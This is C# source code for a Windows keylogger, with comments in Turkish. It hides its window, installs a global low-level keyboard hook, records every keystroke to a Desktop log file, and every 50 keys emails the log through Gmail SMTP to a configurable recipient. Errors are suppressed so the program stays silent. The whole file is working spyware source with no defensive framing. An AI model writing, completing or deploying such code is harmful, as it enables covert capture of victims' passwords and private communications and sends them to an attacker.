using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Threading;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        // Windows API fonksiyonları için gerekli tanımlamalar
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        
        // Hook prosedürü için delegate
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        // Hook handle
        private static IntPtr _hookID = IntPtr.Zero;
        
        // Hook prosedürü
        private LowLevelKeyboardProc _proc = HookCallback;
        
        // Log dosyası yolu
        private static string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "keylog.txt");
        
        // Email ayarları
        private static string smtpServer = "smtp.gmail.com";
        private static int smtpPort = 587;
        private static string senderEmail = "your-email@gmail.com"; // Buraya kendi emailini yaz
        private static string senderPassword = "your-app-password"; // Buraya app password yaz
        private static string recipientEmail = "recipient@gmail.com"; // Buraya alıcı email yaz
        
        // Tuş sayacı (kaç tuş basıldığında email gönderilecek)
        private static int keyCount = 0;
        private static int maxKeysBeforeEmail = 50; // 50 tuş basıldığında email gönder

        public Form1()
        {
            InitializeComponent();
            // Form gizli başlat
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Visible = false;
            
            // Hook'u başlat
            _hookID = SetHook(_proc);
            
            // Log dosyasını oluştur
            if (!File.Exists(logFilePath))
            {
                File.WriteAllText(logFilePath, "Keylogger başlatıldı: " + DateTime.Now.ToString() + Environment.NewLine);
            }
        }

        // Windows API fonksiyonları
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Hook kurulumu
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // Hook callback fonksiyonu - tuş basımlarını yakalar
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyName = ((Keys)vkCode).ToString();
                
                // Tuş bilgisini log dosyasına yaz
                LogKey(keyName);
            }
            
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Tuş bilgisini log dosyasına yazan fonksiyon
        private static void LogKey(string keyName)
        {
            try
            {
                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {keyName}" + Environment.NewLine;
                File.AppendAllText(logFilePath, logEntry);
                
                // Tuş sayacını artır
                keyCount++;
                
                // Belirli sayıda tuş basıldığında email gönder
                if (keyCount >= maxKeysBeforeEmail)
                {
                    SendEmail();
                    keyCount = 0; // Sayacı sıfırla
                }
            }
            catch (Exception ex)
            {
                // Hata durumunda sessizce devam et
            }
        }

        // Email gönderme fonksiyonu
        private static void SendEmail()
        {
            try
            {
                // Log dosyasını oku
                string logContent = File.ReadAllText(logFilePath);
                
                // Email oluştur
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(senderEmail);
                mail.To.Add(recipientEmail);
                mail.Subject = "Keylogger Raporu - " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                mail.Body = "Keylogger verileri:\n\n" + logContent;
                
                // SMTP istemcisi
                SmtpClient smtpClient = new SmtpClient(smtpServer, smtpPort);
                smtpClient.Credentials = new NetworkCredential(senderEmail, senderPassword);
                smtpClient.EnableSsl = true;
                
                // Email gönder
                smtpClient.Send(mail);
                
                // Log dosyasını temizle (isteğe bağlı)
                File.WriteAllText(logFilePath, "Email gönderildi: " + DateTime.Now.ToString() + Environment.NewLine);
            }
            catch (Exception ex)
            {
                // Email gönderme hatası
                File.AppendAllText(logFilePath, "Email gönderme hatası: " + ex.Message + Environment.NewLine);
            }
        }

        // Form kapatılırken hook'u temizle
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
            }
            base.OnFormClosing(e);
        }
    }
}
